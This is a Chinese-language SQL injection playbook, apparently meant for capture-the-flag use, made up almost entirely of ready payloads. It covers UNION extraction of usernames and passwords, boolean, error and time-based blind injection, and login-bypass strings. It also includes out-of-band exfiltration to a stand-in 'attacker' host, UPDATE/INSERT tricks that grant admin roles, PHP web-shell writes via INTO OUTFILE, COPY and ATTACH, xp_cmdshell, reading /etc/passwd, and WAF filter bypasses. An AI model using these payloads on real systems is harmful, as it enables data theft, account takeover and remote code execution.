# SQL Injection Playbook

这是 SQL 注入绕过与利用载荷清单，按上下文、过滤条件和 DBMS 差异选用。NoSQL/GraphQL 与 ORM/查询 DSL 细节分别看 `nosql-graphql.md`、`orm-query-dsl.md`。

## 上下文与入口

### 数字上下文

```sql
1 AND 1=1
1 AND 1=2
1 OR 1=1
1 UNION SELECT NULL
1 ORDER BY 1
1;SELECT 1
```

闭合方式通常不需要引号，适合绕过 quote 过滤。若参数被强转 int，尝试科学计数法、符号、数组/JSON 类型、重复参数或后端二次拼接点。

### 字符串上下文

```sql
' AND '1'='1
' AND '1'='2
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/* 
```

常见闭合：

```sql
'
"
')
")
'))
"))
%')
%"))
```

### LIKE / 搜索

```sql
%' AND 1=1--
%' AND 1=2--
%' UNION SELECT NULL,NULL--
%' ESCAPE '\'
```

搜索场景里 `%`、`_`、转义符、大小写和 collation 都可能影响 oracle。前缀提取可用 `LIKE 'a%'`、`GLOB 'a*'`、`REGEXP '^a'` 或 DBMS 字符函数。

### ORDER BY / 标识符

绑定参数保护不了列名、表名、排序方向：

```sql
id
id DESC
1
CASE WHEN 1=1 THEN id ELSE title END
CASE WHEN 1=2 THEN id ELSE title END
(SELECT CASE WHEN 1=1 THEN id ELSE title END)
```

如果只允许方向：

```sql
ASC,(CASE WHEN 1=1 THEN 1 ELSE 1/0 END)
DESC,(SELECT CASE WHEN 1=2 THEN 1 ELSE 1/0 END)
```

MSSQL/Oracle 排序注入可借错误或子查询制造差异；MySQL 可用 `extractvalue/updatexml`、`if()` 或子查询。

### INSERT / UPDATE / 注册资料

```sql
a'
a'),('probe','probe
a' WHERE 1=2--
a', role='admin'--
```

MySQL 可关注：

```sql
ON DUPLICATE KEY UPDATE password='known',role='admin'
```

UPDATE/改密场景常见目标是改到指定用户、让 WHERE 条件扩大、或把目标数据写进自己可读字段。

### 二阶 / 二次查询 / Routed SQLi

第一处存储 payload，第二处触发查询：

```sql
stored_username = admin'--
stored_email = x' OR '1'='1
stored_sort = CASE WHEN 1=1 THEN id ELSE title END
```

第一条查询结果进入第二条查询时，用 UNION 或可控字段拼出第二阶段 payload：

```sql
UNION SELECT 'admin''--',2,3
UNION SELECT 0x61646d696e272d2d,2,3
```

## DBMS 差异

### 指纹与当前值

```sql
-- MySQL
database()
user()
version()
@@version

-- SQLite
sqlite_version()

-- PostgreSQL
current_database()
current_user
version()

-- MSSQL
DB_NAME()
SYSTEM_USER
@@version

-- Oracle
USER
SYS_CONTEXT('USERENV','CURRENT_SCHEMA')
banner FROM v$version
```

### 元数据入口

```sql
-- MySQL
information_schema.tables
information_schema.columns
mysql.innodb_table_stats
sys.schema_table_statistics

-- SQLite
sqlite_master
sqlite_schema

-- PostgreSQL
pg_catalog.pg_tables
pg_catalog.pg_class
pg_catalog.pg_attribute
information_schema.tables

-- MSSQL
sys.tables
sys.columns
information_schema.tables

-- Oracle
all_tables
all_tab_columns
user_tables
```

### 常用函数差异

```sql
-- 截取
SUBSTR(x,1,1)              MySQL / SQLite / Oracle
SUBSTRING(x,1,1)           PostgreSQL / MSSQL

-- 长度
LENGTH(x)                  MySQL / SQLite / PostgreSQL / Oracle
LEN(x)                     MSSQL

-- 字符码
ASCII(SUBSTR(x,1,1))       MySQL / PostgreSQL / MSSQL / Oracle
unicode(substr(x,1,1))     SQLite

-- 拼接
CONCAT(a,b)                MySQL / MSSQL newer
a||b                       PostgreSQL / Oracle / SQLite
a+b                        MSSQL

-- 单行
LIMIT 1 OFFSET 0           MySQL / PostgreSQL / SQLite
TOP 1                      MSSQL
ROWNUM=1                   Oracle
FETCH FIRST 1 ROWS ONLY    Oracle / PostgreSQL / MSSQL newer
```

### 延迟函数

```sql
SLEEP(3)                                  MySQL
pg_sleep(3)                               PostgreSQL
WAITFOR DELAY '00:00:03'                  MSSQL
DBMS_LOCK.SLEEP(3)                        Oracle
randomblob(100000000)                     SQLite 重计算型延迟
```

## UNION 回显

### 列数与显示位

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
UNION SELECT NULL
UNION SELECT NULL,NULL
UNION SELECT 1,2,3
UNION ALL SELECT 1,2,3
AND 1=0 UNION SELECT 1,2,3
```

### 当前库和版本

```sql
-- MySQL
UNION SELECT database(),user(),version()

-- SQLite
UNION SELECT sqlite_version(),2,3

-- PostgreSQL
UNION SELECT current_database(),current_user,version()

-- MSSQL
UNION SELECT DB_NAME(),SYSTEM_USER,@@version

-- Oracle
UNION SELECT USER,banner,NULL FROM v$version
```

### 表、列、目标数据

```sql
-- MySQL
UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()
UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'
UNION SELECT username,password,role FROM users

-- SQLite
UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table'
UNION SELECT username,password,role FROM users

-- PostgreSQL
UNION SELECT tablename,schemaname,3 FROM pg_catalog.pg_tables
UNION SELECT column_name,table_name,3 FROM information_schema.columns WHERE table_name='users'

-- MSSQL
UNION SELECT name,object_id,3 FROM sys.tables
UNION SELECT name,column_id,3 FROM sys.columns WHERE object_id=OBJECT_ID('users')

-- Oracle
UNION SELECT table_name,NULL,NULL FROM all_tables
UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'
```

### 类型不匹配

```sql
CAST(x AS CHAR)
CONVERT(x, CHAR)
CAST(x AS TEXT)
CAST(x AS VARCHAR)
TO_CHAR(x)
NULL
```

### 关键字被拦

```sql
UNION/**/SELECT
UNION%0aSELECT
UNIunionON SELselectECT          单次删除型过滤
UNION ALL SELECT
/*!50000UNION*/ /*!50000SELECT*/ MySQL versioned comment
```

## 布尔 / 错误 / 时间盲注

### 布尔

```sql
AND 1=1
AND 1=2
AND LENGTH(database())>5
AND ASCII(SUBSTR(database(),1,1))>77
AND (SELECT COUNT(*) FROM users)>0
AND EXISTS(SELECT 1 FROM users WHERE username='admin')
```

### 错误

```sql
AND CASE WHEN 1=1 THEN 1 ELSE 1/0 END
AND CASE WHEN 1=2 THEN 1 ELSE 1/0 END

-- MySQL
AND extractvalue(1,concat(0x7e,database(),0x7e))
AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)

-- PostgreSQL
AND CAST((SELECT current_database()) AS int)=1

-- MSSQL
AND 1=CONVERT(int,(SELECT DB_NAME()))

-- Oracle
AND 1=TO_NUMBER((SELECT USER FROM dual))
```

### 时间

```sql
-- MySQL
AND IF(ASCII(SUBSTR(database(),1,1))>77,SLEEP(3),0)

-- PostgreSQL
AND CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>77 THEN pg_sleep(3) ELSE pg_sleep(0) END IS NULL

-- MSSQL
IF (ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '00:00:03'

-- SQLite
AND CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>77 THEN randomblob(100000000) ELSE 1 END
```

### OOB

```sql
-- MSSQL
EXEC master..xp_dirtree '\\attacker\share'

-- Oracle
UTL_HTTP.REQUEST('http://attacker/'||(SELECT USER FROM dual))
UTL_INADDR.GET_HOST_ADDRESS((SELECT USER FROM dual)||'.attacker')

-- MySQL Windows / FILE privilege
LOAD_FILE('\\\\attacker\\share\\x')
```

## 登录与返回行控制

### 万能密码

```sql
' OR '1'='1'--
' OR 1=1--
admin'--
") OR ("1"="1
') OR ('1'='1
```

### 控制返回用户

```sql
admin' AND '1'='1'--
admin' AND '1'='2'--
' OR username='admin'--
' OR role='admin' ORDER BY id LIMIT 1--
```

### UNION 伪造用户行

```sql
' AND 1=0 UNION SELECT 'admin','hash','admin'--
' AND 1=0 UNION SELECT 1,'admin','admin@example.com','admin'--
' AND 1=0 UNION SELECT 'admin','$2b$12$knownbcrypt','admin'--
```

### 反斜杠逃逸 / 截断 / 注释

```sql
username=\ 
password= OR 1=1--
```

```sql
admin'#
admin'-- -
admin'/*
```

如果密码先哈希，优先伪造兼容哈希行、找固定哈希比较、或让查询返回不需要密码验证的路径。

## 非 SELECT 利用

### INSERT 多行 / 列错位

```sql
abc'),('attacker','knownpass','admin')--
abc', 'x'),('attacker','knownpass')--
```

### UPDATE 覆盖

```sql
x', role='admin' WHERE username='attacker'--
x', password='known' WHERE username='admin'--
x' OR username='admin'--
```

### 写文件 / RCE 辅助

```sql
-- MySQL
UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'
SELECT LOAD_FILE('/etc/passwd')

-- PostgreSQL
COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php'

-- MSSQL
EXEC xp_cmdshell 'whoami'

-- SQLite
ATTACH DATABASE '/var/www/html/shell.php' AS pwn
CREATE TABLE pwn.x(dataz text)
INSERT INTO pwn.x VALUES('<?php system($_GET["cmd"]); ?>')
```

这些能力依赖权限和配置；CTF 中若已有 FILE/xp_cmdshell/COPY/ATTACH 证据再用。

## 过滤绕过

### 空白被禁

```sql
UNION/**/SELECT
UNION%0aSELECT
UNION%09SELECT
(SELECT(database()))
1/**/AND/**/1=1
```

### 引号被禁

```sql
0x61646d696e                         MySQL/MSSQL hex
CHAR(97,100,109,105,110)             MySQL/MSSQL
CHR(97)||CHR(100)||CHR(109)          Oracle/PostgreSQL
$$admin$$                            PostgreSQL dollar quote
NCHAR(97)+NCHAR(100)                 MSSQL
X'61646d696e'                        SQLite blob/string contexts
```

### 逗号被禁

```sql
LIMIT 1 OFFSET 0
SUBSTR(x FROM 1 FOR 1)
MID(x FROM 1 FOR 1)
JOIN 替代多列组合
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b
```

### 注释被禁

补齐原查询尾部而不是依赖注释：

```sql
' AND '1'='1
') AND ('1'='1
' OR '1'='1
') OR ('1'='1
```

或用闭合括号/引号让后续语法自然有效。

### 比较符被禁

```sql
LIKE
IN
BETWEEN
IS NULL
IS NOT NULL
REGEXP
GLOB
NOT BETWEEN
STRCMP(a,b)
```

### `AND` / `OR` 被禁

```sql
&&
||
INTERSECT
UNION
CASE WHEN
IF(condition,a,b)
```

### `UNION` / `SELECT` 被禁

```sql
UN/**/ION SEL/**/ECT
UNIunionON SELselectECT
/*!UNION*/ /*!SELECT*/
WITH cte AS (...) SELECT ...
VALUES(...)
TABLE table_name
```

### `information_schema` 被禁

```sql
-- MySQL
mysql.innodb_table_stats
sys.schema_table_statistics
SHOW TABLES             stacked/query console 场景

-- SQLite
sqlite_master
sqlite_schema

-- PostgreSQL
pg_catalog.pg_tables
pg_catalog.pg_class
pg_catalog.pg_attribute

-- MSSQL
sys.tables
sys.columns

-- Oracle
all_tables
all_tab_columns
user_tables
```

### 函数名被禁

```sql
SUBSTR -> SUBSTRING / MID / LEFT / RIGHT
ASCII  -> ORD / unicode / TO_NUMBER(ASCIISTR(...)) / cast byte
LENGTH -> LEN / CHAR_LENGTH / OCTET_LENGTH
SLEEP  -> BENCHMARK / pg_sleep / WAITFOR / randomblob
IF     -> CASE WHEN
CONCAT -> || / + / CONCAT_WS
```

### 大小写 / 单次删除型过滤

```sql
UnIoN SeLeCt
UNunionION SELselectECT
S/**/ELECT
SEL%0aECT
/*!50000SELECT*/
```

### 编码与解析差异

```text
URL 编码 / 双 URL 编码
JSON 数字、布尔、null、数组、对象类型替换
重复参数覆盖：id=1&id=payload
分隔符污染：id=1;payload
宽字节：GBK/Shift-JIS 中 %bf%27、%df%27 一类只在对应编码链存在时用
XML 实体：&#x27;、&apos;
HQL/ORM 空白：U+00A0、注释不一定可用
```

### WAF 正则异常

```text
关键字嵌套：SELSELECTECT
长输入触发正则回溯失败
版本注释绕 MySQL WAF
参数拆分后端拼接：q=UNI&q=ON SELECT
```

## 常用目标数据

```sql
-- 当前身份/库
database(), user(), version()
current_database(), current_user
DB_NAME(), SYSTEM_USER, @@version
USER, SYS_CONTEXT('USERENV','CURRENT_SCHEMA')

-- 用户表候选
users
user
accounts
members
admin
credentials
flags
secrets

-- 列候选
username
password
passwd
hash
role
is_admin
token
api_key
secret
flag
```
